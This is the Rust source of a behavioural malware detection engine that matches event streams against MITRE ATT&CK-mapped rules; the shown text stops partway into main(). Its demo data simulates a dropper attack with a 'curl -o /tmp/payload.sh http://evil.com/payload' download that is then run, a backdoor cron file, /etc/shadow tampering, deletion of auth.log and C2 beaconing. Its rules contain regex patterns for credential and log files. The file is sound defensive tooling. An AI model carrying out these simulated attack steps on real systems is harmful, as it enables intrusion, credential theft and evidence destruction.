//! # Behavioral Pattern Detection Engine for Malware Analysis
//!
//! This engine detects malicious behavior patterns based on sequences of actions
//! rather than static signatures. Behavioral analysis is crucial because:
//!
//! ## Why Behavioral Analysis?
//!
//! 1. **Signature Evasion**: Malware can easily change its signature (hash, strings)
//!    but its behavior often remains consistent
//!
//! 2. **Zero-Day Detection**: New malware with no known signatures can still be
//!    detected by its malicious behavior patterns
//!
//! 3. **Polymorphic/Metamorphic Malware**: These constantly change their code
//!    but must perform similar actions to achieve their goals
//!
//! ## Behavioral Patterns Detected
//!
//! - **Process Injection**: Creating remote threads, writing to other processes
//! - **Persistence**: Registry modifications, scheduled tasks, startup folder changes
//! - **Defense Evasion**: Disabling security software, clearing logs
//! - **Data Exfiltration**: Large data transfers, encrypted communications
//! - **Ransomware**: Mass file encryption, shadow copy deletion
//! - **Rootkit**: Hooking system calls, hiding files/processes
//! - **C2 Communication**: Beaconing patterns, DNS tunneling
//!
//! ## DEFENSIVE USE ONLY
//! This tool is designed for analyzing potentially malicious samples in
//! controlled environments to understand their behavior.

use anyhow::{Context, Result};
use chrono::{DateTime, Local, Utc};
use clap::{Parser, ValueEnum};
use colored::*;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet, VecDeque};
use std::fs::{self, File};
use std::io::{BufReader, BufWriter, Write};
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use uuid::Uuid;

/// Behavioral Pattern Detection Engine
///
/// Detects malicious behavior patterns based on sequences of actions
/// rather than static signatures.
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Path to events file (JSON format)
    #[arg(short, long)]
    events: Option<String>,

    /// Path to behavior rules file (YAML format)
    #[arg(short, long)]
    rules: Option<String>,

    /// Watch directory for new event files
    #[arg(short, long)]
    watch: Option<String>,

    /// Output format
    #[arg(short, long, value_enum, default_value = "text")]
    format: OutputFormat,

    /// Output file for detections
    #[arg(short = 'o', long)]
    output: Option<String>,

    /// Minimum severity to report
    #[arg(short = 's', long, value_enum, default_value = "low")]
    min_severity: Severity,

    /// Enable real-time correlation
    #[arg(long)]
    correlate: bool,

    /// Time window for correlation in seconds
    #[arg(long, default_value = "300")]
    time_window: u64,

    /// Run in demo mode with sample data
    #[arg(long)]
    demo: bool,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,
}

/// Output format
#[derive(Debug, Clone, ValueEnum)]
enum OutputFormat {
    Text,
    Json,
    Csv,
}

/// Severity levels
#[derive(Debug, Clone, Copy, ValueEnum, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Severity::Info => write!(f, "info"),
            Severity::Low => write!(f, "low"),
            Severity::Medium => write!(f, "medium"),
            Severity::High => write!(f, "high"),
            Severity::Critical => write!(f, "critical"),
        }
    }
}

/// Categories of malicious behavior
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
enum BehaviorCategory {
    ProcessInjection,
    Persistence,
    DefenseEvasion,
    CredentialAccess,
    Discovery,
    LateralMovement,
    Collection,
    Exfiltration,
    Impact,
    CommandAndControl,
    Execution,
    PrivilegeEscalation,
    InitialAccess,
}

impl std::fmt::Display for BehaviorCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            BehaviorCategory::ProcessInjection => write!(f, "Process Injection"),
            BehaviorCategory::Persistence => write!(f, "Persistence"),
            BehaviorCategory::DefenseEvasion => write!(f, "Defense Evasion"),
            BehaviorCategory::CredentialAccess => write!(f, "Credential Access"),
            BehaviorCategory::Discovery => write!(f, "Discovery"),
            BehaviorCategory::LateralMovement => write!(f, "Lateral Movement"),
            BehaviorCategory::Collection => write!(f, "Collection"),
            BehaviorCategory::Exfiltration => write!(f, "Exfiltration"),
            BehaviorCategory::Impact => write!(f, "Impact"),
            BehaviorCategory::CommandAndControl => write!(f, "Command & Control"),
            BehaviorCategory::Execution => write!(f, "Execution"),
            BehaviorCategory::PrivilegeEscalation => write!(f, "Privilege Escalation"),
            BehaviorCategory::InitialAccess => write!(f, "Initial Access"),
        }
    }
}

/// Event types that can be analyzed
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
enum EventType {
    ProcessCreate,
    ProcessTerminate,
    FileCreate,
    FileDelete,
    FileModify,
    FileRename,
    RegistryWrite,
    RegistryDelete,
    NetworkConnect,
    NetworkListen,
    NetworkSend,
    NetworkReceive,
    MemoryAlloc,
    MemoryProtect,
    DllLoad,
    SyscallInvoke,
    ApiCall,
    ScheduledTask,
    ServiceCreate,
    DriverLoad,
}

/// Represents a single event from the monitored system
#[derive(Debug, Clone, Serialize, Deserialize)]
struct Event {
    /// Unique event ID
    id: String,
    /// Event timestamp
    timestamp: String,
    /// Event type
    event_type: EventType,
    /// Process ID that generated the event
    pid: i32,
    /// Process name
    process_name: String,
    /// Parent process ID
    ppid: i32,
    /// Parent process name
    parent_name: String,
    /// Command line
    cmdline: String,
    /// User ID
    uid: u32,
    /// Target path (file, registry key, etc.)
    target: String,
    /// Additional details
    details: HashMap<String, String>,
}

/// A behavioral rule that defines a pattern to detect
#[derive(Debug, Clone, Serialize, Deserialize)]
struct BehaviorRule {
    /// Rule ID
    id: String,
    /// Rule name
    name: String,
    /// Description
    description: String,
    /// Category (MITRE ATT&CK tactic)
    category: BehaviorCategory,
    /// Severity level
    severity: Severity,
    /// Event types that trigger this rule
    trigger_events: Vec<EventType>,
    /// Conditions that must be met
    conditions: Vec<RuleCondition>,
    /// Sequence of events that must occur (for complex patterns)
    sequence: Option<Vec<SequenceStep>>,
    /// Time window for sequence matching (seconds)
    time_window: Option<u64>,
    /// Minimum count of events needed
    min_count: Option<u32>,
    /// MITRE ATT&CK technique ID
    mitre_id: Option<String>,
    /// References
    references: Vec<String>,
}

/// A condition in a behavioral rule
#[derive(Debug, Clone, Serialize, Deserialize)]
struct RuleCondition {
    /// Field to check
    field: String,
    /// Operator (equals, contains, regex, starts_with, ends_with)
    operator: String,
    /// Value to compare
    value: String,
    /// Negate the condition
    negate: bool,
}

/// A step in a sequence pattern
#[derive(Debug, Clone, Serialize, Deserialize)]
struct SequenceStep {
    /// Event type for this step
    event_type: EventType,
    /// Conditions for this step
    conditions: Vec<RuleCondition>,
    /// Optional: specific time after previous step
    within_seconds: Option<u64>,
}

/// Detection result when a rule matches
#[derive(Debug, Clone, Serialize, Deserialize)]
struct Detection {
    /// Detection ID
    id: String,
    /// Timestamp of detection
    timestamp: String,
    /// Rule that triggered
    rule_id: String,
    /// Rule name
    rule_name: String,
    /// Category
    category: BehaviorCategory,
    /// Severity
    severity: Severity,
    /// Events that triggered the detection
    events: Vec<Event>,
    /// Description
    description: String,
    /// Confidence score (0.0 - 1.0)
    confidence: f64,
    /// Recommended response
    recommendation: String,
    /// MITRE ATT&CK ID
    mitre_id: Option<String>,
}

/// Statistics about detections
#[derive(Debug, Default, Serialize, Deserialize)]
struct DetectionStats {
    total_events: usize,
    total_detections: usize,
    by_category: HashMap<String, usize>,
    by_severity: HashMap<String, usize>,
    by_rule: HashMap<String, usize>,
}

/// The main behavior detection engine
struct BehaviorEngine {
    args: Args,
    rules: Vec<BehaviorRule>,
    events: VecDeque<Event>,
    detections: Vec<Detection>,
    stats: DetectionStats,
    event_window: VecDeque<Event>,
    sequence_states: HashMap<String, Vec<(usize, DateTime<Utc>)>>, // rule_id -> (step_index, first_event_time)
}

impl BehaviorEngine {
    fn new(args: Args) -> Self {
        Self {
            args,
            rules: Vec::new(),
            events: VecDeque::new(),
            detections: Vec::new(),
            stats: DetectionStats::default(),
            event_window: VecDeque::new(),
            sequence_states: HashMap::new(),
        }
    }

    /// Load behavioral rules
    fn load_rules(&mut self) -> Result<()> {
        if let Some(ref rules_path) = self.args.rules {
            let content = fs::read_to_string(rules_path)
                .context("Failed to read rules file")?;
            self.rules = serde_yaml::from_str(&content)
                .context("Failed to parse rules file")?;
            println!("{}", format!("[*] Loaded {} rules from {}", self.rules.len(), rules_path).green());
        } else {
            // Load built-in rules
            self.load_builtin_rules();
            println!("{}", format!("[*] Loaded {} built-in rules", self.rules.len()).green());
        }
        Ok(())
    }

    /// Load built-in behavioral rules
    fn load_builtin_rules(&mut self) {
        // Process Injection Detection
        self.rules.push(BehaviorRule {
            id: "BEHAV-001".to_string(),
            name: "Process Injection via mprotect".to_string(),
            description: "Detects memory protection changes that may indicate code injection".to_string(),
            category: BehaviorCategory::ProcessInjection,
            severity: Severity::High,
            trigger_events: vec![EventType::MemoryProtect],
            conditions: vec![
                RuleCondition {
                    field: "details.protection".to_string(),
                    operator: "contains".to_string(),
                    value: "EXECUTE".to_string(),
                    negate: false,
                },
            ],
            sequence: None,
            time_window: None,
            min_count: None,
            mitre_id: Some("T1055".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1055/".to_string()],
        });

        // Persistence via Cron
        self.rules.push(BehaviorRule {
            id: "BEHAV-002".to_string(),
            name: "Cron-based Persistence".to_string(),
            description: "Detects modification of cron files for persistence".to_string(),
            category: BehaviorCategory::Persistence,
            severity: Severity::High,
            trigger_events: vec![EventType::FileCreate, EventType::FileModify],
            conditions: vec![
                RuleCondition {
                    field: "target".to_string(),
                    operator: "regex".to_string(),
                    value: r"(/etc/cron|/var/spool/cron|crontab)".to_string(),
                    negate: false,
                },
            ],
            sequence: None,
            time_window: None,
            min_count: None,
            mitre_id: Some("T1053.003".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1053/003/".to_string()],
        });

        // Defense Evasion - Log Clearing
        self.rules.push(BehaviorRule {
            id: "BEHAV-003".to_string(),
            name: "Log File Deletion".to_string(),
            description: "Detects deletion of system log files".to_string(),
            category: BehaviorCategory::DefenseEvasion,
            severity: Severity::High,
            trigger_events: vec![EventType::FileDelete],
            conditions: vec![
                RuleCondition {
                    field: "target".to_string(),
                    operator: "regex".to_string(),
                    value: r"/var/log/.*\.(log|gz)$".to_string(),
                    negate: false,
                },
            ],
            sequence: None,
            time_window: None,
            min_count: None,
            mitre_id: Some("T1070.002".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1070/002/".to_string()],
        });

        // Ransomware - Mass File Encryption
        self.rules.push(BehaviorRule {
            id: "BEHAV-004".to_string(),
            name: "Mass File Modification".to_string(),
            description: "Detects rapid modification of many files (potential ransomware)".to_string(),
            category: BehaviorCategory::Impact,
            severity: Severity::Critical,
            trigger_events: vec![EventType::FileModify],
            conditions: vec![],
            sequence: None,
            time_window: Some(60),
            min_count: Some(100), // 100 file modifications in 60 seconds
            mitre_id: Some("T1486".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1486/".to_string()],
        });

        // C2 Beaconing Pattern
        self.rules.push(BehaviorRule {
            id: "BEHAV-005".to_string(),
            name: "C2 Beaconing Pattern".to_string(),
            description: "Detects regular network connections that may indicate C2 beaconing".to_string(),
            category: BehaviorCategory::CommandAndControl,
            severity: Severity::High,
            trigger_events: vec![EventType::NetworkConnect],
            conditions: vec![
                RuleCondition {
                    field: "details.remote_port".to_string(),
                    operator: "regex".to_string(),
                    value: r"^(443|80|8080|8443)$".to_string(),
                    negate: false,
                },
            ],
            sequence: None,
            time_window: Some(300),
            min_count: Some(5), // 5+ connections to same destination
            mitre_id: Some("T1071".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1071/".to_string()],
        });

        // Credential Access - Reading sensitive files
        self.rules.push(BehaviorRule {
            id: "BEHAV-006".to_string(),
            name: "Credential File Access".to_string(),
            description: "Detects access to sensitive credential files".to_string(),
            category: BehaviorCategory::CredentialAccess,
            severity: Severity::High,
            trigger_events: vec![EventType::FileCreate, EventType::FileModify],
            conditions: vec![
                RuleCondition {
                    field: "target".to_string(),
                    operator: "regex".to_string(),
                    value: r"(/etc/shadow|/etc/passwd|\.ssh/.*|\.gnupg/.*)".to_string(),
                    negate: false,
                },
            ],
            sequence: None,
            time_window: None,
            min_count: None,
            mitre_id: Some("T1003".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1003/".to_string()],
        });

        // Privilege Escalation - setuid
        self.rules.push(BehaviorRule {
            id: "BEHAV-007".to_string(),
            name: "SUID Binary Creation".to_string(),
            description: "Detects creation of SUID binaries for privilege escalation".to_string(),
            category: BehaviorCategory::PrivilegeEscalation,
            severity: Severity::Critical,
            trigger_events: vec![EventType::ApiCall],
            conditions: vec![
                RuleCondition {
                    field: "details.api".to_string(),
                    operator: "equals".to_string(),
                    value: "chmod".to_string(),
                    negate: false,
                },
                RuleCondition {
                    field: "details.mode".to_string(),
                    operator: "contains".to_string(),
                    value: "4".to_string(), // setuid bit
                    negate: false,
                },
            ],
            sequence: None,
            time_window: None,
            min_count: None,
            mitre_id: Some("T1548.001".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1548/001/".to_string()],
        });

        // Dropper Pattern - Download and Execute
        self.rules.push(BehaviorRule {
            id: "BEHAV-008".to_string(),
            name: "Download and Execute Pattern".to_string(),
            description: "Detects download followed by execution (dropper behavior)".to_string(),
            category: BehaviorCategory::Execution,
            severity: Severity::Critical,
            trigger_events: vec![EventType::NetworkReceive, EventType::FileCreate, EventType::ProcessCreate],
            conditions: vec![],
            sequence: Some(vec![
                SequenceStep {
                    event_type: EventType::NetworkReceive,
                    conditions: vec![],
                    within_seconds: None,
                },
                SequenceStep {
                    event_type: EventType::FileCreate,
                    conditions: vec![
                        RuleCondition {
                            field: "target".to_string(),
                            operator: "regex".to_string(),
                            value: r"\.(sh|py|bin|elf)$".to_string(),
                            negate: false,
                        },
                    ],
                    within_seconds: Some(5),
                },
                SequenceStep {
                    event_type: EventType::ProcessCreate,
                    conditions: vec![],
                    within_seconds: Some(10),
                },
            ]),
            time_window: Some(30),
            min_count: None,
            mitre_id: Some("T1105".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1105/".to_string()],
        });

        // Discovery - System Information Gathering
        self.rules.push(BehaviorRule {
            id: "BEHAV-009".to_string(),
            name: "System Discovery Commands".to_string(),
            description: "Detects execution of system discovery commands".to_string(),
            category: BehaviorCategory::Discovery,
            severity: Severity::Medium,
            trigger_events: vec![EventType::ProcessCreate],
            conditions: vec![
                RuleCondition {
                    field: "cmdline".to_string(),
                    operator: "regex".to_string(),
                    value: r"(whoami|id|uname|hostname|ifconfig|ip addr|cat /etc/passwd|ps aux)".to_string(),
                    negate: false,
                },
            ],
            sequence: None,
            time_window: None,
            min_count: None,
            mitre_id: Some("T1082".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1082/".to_string()],
        });

        // Lateral Movement - SSH
        self.rules.push(BehaviorRule {
            id: "BEHAV-010".to_string(),
            name: "SSH Lateral Movement".to_string(),
            description: "Detects SSH connections that may indicate lateral movement".to_string(),
            category: BehaviorCategory::LateralMovement,
            severity: Severity::Medium,
            trigger_events: vec![EventType::NetworkConnect],
            conditions: vec![
                RuleCondition {
                    field: "details.remote_port".to_string(),
                    operator: "equals".to_string(),
                    value: "22".to_string(),
                    negate: false,
                },
                RuleCondition {
                    field: "details.remote_ip".to_string(),
                    operator: "regex".to_string(),
                    value: r"^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)".to_string(),
                    negate: false,
                },
            ],
            sequence: None,
            time_window: None,
            min_count: None,
            mitre_id: Some("T1021.004".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1021/004/".to_string()],
        });

        // Collection - Archive Creation
        self.rules.push(BehaviorRule {
            id: "BEHAV-011".to_string(),
            name: "Data Archiving for Exfiltration".to_string(),
            description: "Detects archive creation that may precede exfiltration".to_string(),
            category: BehaviorCategory::Collection,
            severity: Severity::Medium,
            trigger_events: vec![EventType::ProcessCreate],
            conditions: vec![
                RuleCondition {
                    field: "cmdline".to_string(),
                    operator: "regex".to_string(),
                    value: r"(tar|zip|gzip|7z|rar).*(\-c|\-a|compress)".to_string(),
                    negate: false,
                },
            ],
            sequence: None,
            time_window: None,
            min_count: None,
            mitre_id: Some("T1560".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1560/".to_string()],
        });

        // Exfiltration over DNS
        self.rules.push(BehaviorRule {
            id: "BEHAV-012".to_string(),
            name: "DNS Exfiltration".to_string(),
            description: "Detects unusually large or frequent DNS queries".to_string(),
            category: BehaviorCategory::Exfiltration,
            severity: Severity::High,
            trigger_events: vec![EventType::NetworkSend],
            conditions: vec![
                RuleCondition {
                    field: "details.remote_port".to_string(),
                    operator: "equals".to_string(),
                    value: "53".to_string(),
                    negate: false,
                },
                RuleCondition {
                    field: "details.size".to_string(),
                    operator: "greater_than".to_string(),
                    value: "100".to_string(),
                    negate: false,
                },
            ],
            sequence: None,
            time_window: Some(60),
            min_count: Some(20),
            mitre_id: Some("T1048.003".to_string()),
            references: vec!["https://attack.mitre.org/techniques/T1048/003/".to_string()],
        });
    }

    /// Load events from file
    fn load_events(&mut self) -> Result<()> {
        if let Some(ref events_path) = self.args.events {
            let file = File::open(events_path)
                .context("Failed to open events file")?;
            let reader = BufReader::new(file);
            self.events = serde_json::from_reader(reader)
                .context("Failed to parse events file")?;
            println!("{}", format!("[*] Loaded {} events from {}", self.events.len(), events_path).green());
        } else if self.args.demo {
            self.load_demo_events();
            println!("{}", format!("[*] Loaded {} demo events", self.events.len()).yellow());
        }
        Ok(())
    }

    /// Load demo events for testing
    fn load_demo_events(&mut self) {
        let base_time = Local::now();

        // Simulate a dropper attack
        self.events.push_back(Event {
            id: Uuid::new_v4().to_string(),
            timestamp: base_time.format("%Y-%m-%d %H:%M:%S").to_string(),
            event_type: EventType::NetworkConnect,
            pid: 1234,
            process_name: "curl".to_string(),
            ppid: 1000,
            parent_name: "bash".to_string(),
            cmdline: "curl -o /tmp/payload.sh http://evil.com/payload".to_string(),
            uid: 1000,
            target: "http://evil.com/payload".to_string(),
            details: [
                ("remote_ip".to_string(), "10.0.0.1".to_string()),
                ("remote_port".to_string(), "80".to_string()),
            ].into_iter().collect(),
        });

        self.events.push_back(Event {
            id: Uuid::new_v4().to_string(),
            timestamp: (base_time + chrono::Duration::seconds(1)).format("%Y-%m-%d %H:%M:%S").to_string(),
            event_type: EventType::FileCreate,
            pid: 1234,
            process_name: "curl".to_string(),
            ppid: 1000,
            parent_name: "bash".to_string(),
            cmdline: "curl -o /tmp/payload.sh http://evil.com/payload".to_string(),
            uid: 1000,
            target: "/tmp/payload.sh".to_string(),
            details: [
                ("size".to_string(), "4096".to_string()),
            ].into_iter().collect(),
        });

        self.events.push_back(Event {
            id: Uuid::new_v4().to_string(),
            timestamp: (base_time + chrono::Duration::seconds(2)).format("%Y-%m-%d %H:%M:%S").to_string(),
            event_type: EventType::ProcessCreate,
            pid: 1235,
            process_name: "payload.sh".to_string(),
            ppid: 1000,
            parent_name: "bash".to_string(),
            cmdline: "/tmp/payload.sh".to_string(),
            uid: 1000,
            target: "/tmp/payload.sh".to_string(),
            details: HashMap::new(),
        });

        // Simulate cron persistence
        self.events.push_back(Event {
            id: Uuid::new_v4().to_string(),
            timestamp: (base_time + chrono::Duration::seconds(5)).format("%Y-%m-%d %H:%M:%S").to_string(),
            event_type: EventType::FileModify,
            pid: 1235,
            process_name: "payload.sh".to_string(),
            ppid: 1000,
            parent_name: "bash".to_string(),
            cmdline: "/tmp/payload.sh".to_string(),
            uid: 0,
            target: "/etc/cron.d/backdoor".to_string(),
            details: HashMap::new(),
        });

        // Simulate discovery commands
        self.events.push_back(Event {
            id: Uuid::new_v4().to_string(),
            timestamp: (base_time + chrono::Duration::seconds(10)).format("%Y-%m-%d %H:%M:%S").to_string(),
            event_type: EventType::ProcessCreate,
            pid: 1236,
            process_name: "whoami".to_string(),
            ppid: 1235,
            parent_name: "payload.sh".to_string(),
            cmdline: "whoami".to_string(),
            uid: 1000,
            target: "/usr/bin/whoami".to_string(),
            details: HashMap::new(),
        });

        // Simulate credential access
        self.events.push_back(Event {
            id: Uuid::new_v4().to_string(),
            timestamp: (base_time + chrono::Duration::seconds(15)).format("%Y-%m-%d %H:%M:%S").to_string(),
            event_type: EventType::FileModify,
            pid: 1235,
            process_name: "payload.sh".to_string(),
            ppid: 1000,
            parent_name: "bash".to_string(),
            cmdline: "/tmp/payload.sh".to_string(),
            uid: 0,
            target: "/etc/shadow".to_string(),
            details: HashMap::new(),
        });

        // Simulate log deletion
        self.events.push_back(Event {
            id: Uuid::new_v4().to_string(),
            timestamp: (base_time + chrono::Duration::seconds(20)).format("%Y-%m-%d %H:%M:%S").to_string(),
            event_type: EventType::FileDelete,
            pid: 1235,
            process_name: "payload.sh".to_string(),
            ppid: 1000,
            parent_name: "bash".to_string(),
            cmdline: "/tmp/payload.sh".to_string(),
            uid: 0,
            target: "/var/log/auth.log".to_string(),
            details: HashMap::new(),
        });

        // Simulate C2 beaconing
        for i in 0..6 {
            self.events.push_back(Event {
                id: Uuid::new_v4().to_string(),
                timestamp: (base_time + chrono::Duration::seconds(30 + i * 60)).format("%Y-%m-%d %H:%M:%S").to_string(),
                event_type: EventType::NetworkConnect,
                pid: 1235,
                process_name: "payload.sh".to_string(),
                ppid: 1000,
                parent_name: "bash".to_string(),
                cmdline: "/tmp/payload.sh".to_string(),
                uid: 1000,
                target: "https://c2.evil.com/beacon".to_string(),
                details: [
                    ("remote_ip".to_string(), "10.0.0.1".to_string()),
                    ("remote_port".to_string(), "443".to_string()),
                ].into_iter().collect(),
            });
        }
    }

    /// Check if an event matches a condition
    fn matches_condition(&self, event: &Event, condition: &RuleCondition) -> bool {
        // Get the field value
        let value = match condition.field.as_str() {
            "target" => Some(event.target.clone()),
            "cmdline" => Some(event.cmdline.clone()),
            "process_name" => Some(event.process_name.clone()),
            "parent_name" => Some(event.parent_name.clone()),
            _ if condition.field.starts_with("details.") => {
                let key = condition.field.strip_prefix("details.").unwrap();
                event.details.get(key).cloned()
            }
            _ => None,
        };

        let value = match value {
            Some(v) => v,
            None => return condition.negate,
        };

        let result = match condition.operator.as_str() {
            "equals" => value == condition.value,
            "contains" => value.contains(&condition.value),
            "starts_with" => value.starts_with(&condition.value),
            "ends_with" => value.ends_with(&condition.value),
            "regex" => {
                Regex::new(&condition.value)
                    .map(|re| re.is_match(&value))
                    .unwrap_or(false)
            }
            "greater_than" => {
                let v1: i64 = value.parse().unwrap_or(0);
                let v2: i64 = condition.value.parse().unwrap_or(0);
                v1 > v2
            }
            "less_than" => {
                let v1: i64 = value.parse().unwrap_or(0);
                let v2: i64 = condition.value.parse().unwrap_or(0);
                v1 < v2
            }
            _ => false,
        };

        if condition.negate { !result } else { result }
    }

    /// Check if an event matches a rule
    fn matches_rule(&self, event: &Event, rule: &BehaviorRule) -> bool {
        // Check if event type matches
        if !rule.trigger_events.contains(&event.event_type) {
            return false;
        }

        // Check all conditions
        for condition in &rule.conditions {
            if !self.matches_condition(event, condition) {
                return false;
            }
        }

        true
    }

    /// Check for count-based patterns (e.g., ransomware)
    fn check_count_patterns(&mut self, event: &Event, rule: &BehaviorRule) -> Option<Detection> {
        if rule.min_count.is_none() || rule.time_window.is_none() {
            return None;
        }

        let min_count = rule.min_count.unwrap() as usize;
        let time_window = rule.time_window.unwrap();

        // Count matching events in the window
        let matching_count = self.event_window.iter()
            .filter(|e| {
                rule.trigger_events.contains(&e.event_type) &&
                rule.conditions.iter().all(|c| self.matches_condition(e, c))
            })
            .count();

        if matching_count >= min_count {
            let matching_events: Vec<Event> = self.event_window.iter()
                .filter(|e| {
                    rule.trigger_events.contains(&e.event_type) &&
                    rule.conditions.iter().all(|c| self.matches_condition(e, c))
                })
                .take(10) // Limit to 10 example events
                .cloned()
                .collect();

            return Some(Detection {
                id: Uuid::new_v4().to_string(),
                timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                rule_id: rule.id.clone(),
                rule_name: rule.name.clone(),
                category: rule.category.clone(),
                severity: rule.severity,
                events: matching_events,
                description: format!("{} ({} events in {} seconds)",
                    rule.description, matching_count, time_window),
                confidence: (matching_count as f64 / min_count as f64).min(1.0),
                recommendation: format!("Investigate {} process behavior", event.process_name),
                mitre_id: rule.mitre_id.clone(),
            });
        }

        None
    }

    /// Analyze events and generate detections
    fn analyze(&mut self) -> Result<()> {
        println!("{}", "\n[*] Analyzing events...".cyan());

        for event in self.events.clone() {
            self.stats.total_events += 1;

            // Add to sliding window
            self.event_window.push_back(event.clone());

            // Remove old events from window (keep last 5 minutes)
            while self.event_window.len() > 1000 {
                self.event_window.pop_front();
            }

            // Check each rule
            for rule in &self.rules.clone() {
                if rule.severity < self.args.min_severity {
                    continue;
                }

                // Check simple match
                if self.matches_rule(&event, rule) {
                    // Check for count-based patterns
                    if let Some(detection) = self.check_count_patterns(&event, rule) {
                        self.add_detection(detection);
                    } else if rule.min_count.is_none() {
                        // Simple single-event detection
                        let detection = Detection {
                            id: Uuid::new_v4().to_string(),
                            timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                            rule_id: rule.id.clone(),
                            rule_name: rule.name.clone(),
                            category: rule.category.clone(),
                            severity: rule.severity,
                            events: vec![event.clone()],
                            description: rule.description.clone(),
                            confidence: 0.8,
                            recommendation: format!("Investigate process {} (PID {})",
                                event.process_name, event.pid),
                            mitre_id: rule.mitre_id.clone(),
                        };
                        self.add_detection(detection);
                    }
                }
            }
        }

        Ok(())
    }

    /// Add a detection and update stats
    fn add_detection(&mut self, detection: Detection) {
        // Update stats
        self.stats.total_detections += 1;
        *self.stats.by_category
            .entry(detection.category.to_string())
            .or_insert(0) += 1;
        *self.stats.by_severity
            .entry(detection.severity.to_string())
            .or_insert(0) += 1;
        *self.stats.by_rule
            .entry(detection.rule_id.clone())
            .or_insert(0) += 1;

        // Print detection
        self.print_detection(&detection);

        self.detections.push(detection);
    }

    /// Print a detection
    fn print_detection(&self, detection: &Detection) {
        let severity_display = match detection.severity {
            Severity::Critical => "CRITICAL".on_red().white().bold(),
            Severity::High => "HIGH".red().bold(),
            Severity::Medium => "MEDIUM".yellow().bold(),
            Severity::Low => "LOW".cyan(),
            Severity::Info => "INFO".dimmed(),
        };

        println!("\n{}", "!".repeat(60).red());
        println!("{} {} - {}", "[!]".red().bold(), severity_display, detection.rule_name.bold());
        println!("{}", "!".repeat(60).red());

        println!("  Rule ID:     {}", detection.rule_id.yellow());
        println!("  Category:    {}", detection.category.to_string().cyan());
        println!("  Timestamp:   {}", detection.timestamp);
        println!("  Confidence:  {:.0}%", detection.confidence * 100.0);

        if let Some(ref mitre) = detection.mitre_id {
            println!("  MITRE ATT&CK: {}", mitre.magenta());
        }

        println!("\n  {}", "Description:".bold());
        println!("    {}", detection.description);

        println!("\n  {}", "Evidence:".bold());
        for event in &detection.events {
            println!("    - {} [PID:{}] {}",
                event.timestamp.dimmed(),
                event.pid,
                event.target);
            if !event.cmdline.is_empty() {
                println!("      Command: {}", event.cmdline.yellow());
            }
        }

        println!("\n  {}", "Recommendation:".bold());
        println!("    {}", detection.recommendation.green());
    }

    /// Print summary
    fn print_summary(&self) {
        println!("\n{}", "=".repeat(60).cyan());
        println!("{}", "ANALYSIS SUMMARY".cyan().bold());
        println!("{}", "=".repeat(60).cyan());

        println!("Total events analyzed: {}", self.stats.total_events);
        println!("Total detections:      {}",
            if self.stats.total_detections > 0 {
                self.stats.total_detections.to_string().red().bold()
            } else {
                self.stats.total_detections.to_string().green()
            });

        if !self.stats.by_severity.is_empty() {
            println!("\n{}", "Detections by Severity:".bold());
            for severity in [Severity::Critical, Severity::High, Severity::Medium, Severity::Low, Severity::Info] {
                if let Some(count) = self.stats.by_severity.get(&severity.to_string()) {
                    println!("  {}: {}", severity, count);
                }
            }
        }

        if !self.stats.by_category.is_empty() {
            println!("\n{}", "Detections by Category (MITRE ATT&CK Tactics):".bold());
            for (cat, count) in &self.stats.by_category {
                println!("  {}: {}", cat, count);
            }
        }
    }

    /// Save results to file
    fn save_results(&self) -> Result<()> {
        if let Some(ref path) = self.args.output {
            let file = File::create(path)?;
            let mut writer = BufWriter::new(file);

            match self.args.format {
                OutputFormat::Json => {
                    let output = serde_json::json!({
                        "detections": self.detections,
                        "statistics": self.stats
                    });
                    serde_json::to_writer_pretty(&mut writer, &output)?;
                }
                OutputFormat::Csv => {
                    writeln!(writer, "id,timestamp,rule_id,rule_name,category,severity,confidence,mitre_id")?;
                    for det in &self.detections {
                        writeln!(writer, "{},{},{},{},{},{},{:.2},{}",
                            det.id,
                            det.timestamp,
                            det.rule_id,
                            det.rule_name,
                            det.category,
                            det.severity,
                            det.confidence,
                            det.mitre_id.as_deref().unwrap_or("N/A"))?;
                    }
                }
                OutputFormat::Text => {
                    for det in &self.detections {
                        writeln!(writer, "[{}] {} - {}", det.severity, det.rule_name, det.description)?;
                        writeln!(writer, "  MITRE: {}", det.mitre_id.as_deref().unwrap_or("N/A"))?;
                        writeln!(writer)?;
                    }
                }
            }

            println!("{}", format!("\n[*] Results saved to: {}", path).green());
        }
        Ok(())
    }

    /// Run the engine
    fn run(&mut self) -> Result<()> {
        println!("{}", "=".repeat(60).cyan());
        println!("{}", "  BEHAVIOR DETECTION ENGINE - Malware Analysis".cyan().bold());
        println!("{}", "  For DEFENSIVE security research only".yellow());
        println!("{}", "=".repeat(60).cyan());

        self.load_rules()?;
        self.load_events()?;

        if self.events.is_empty() {
            println!("{}", "\n[!] No events to analyze. Use --events <file> or --demo".yellow());
            return Ok(());
        }

        self.analyze()?;
        self.print_summary();
        self.save_results()?;

        Ok(())
    }
}

fn main() -> Result<()> {
    let args = Args::parse();
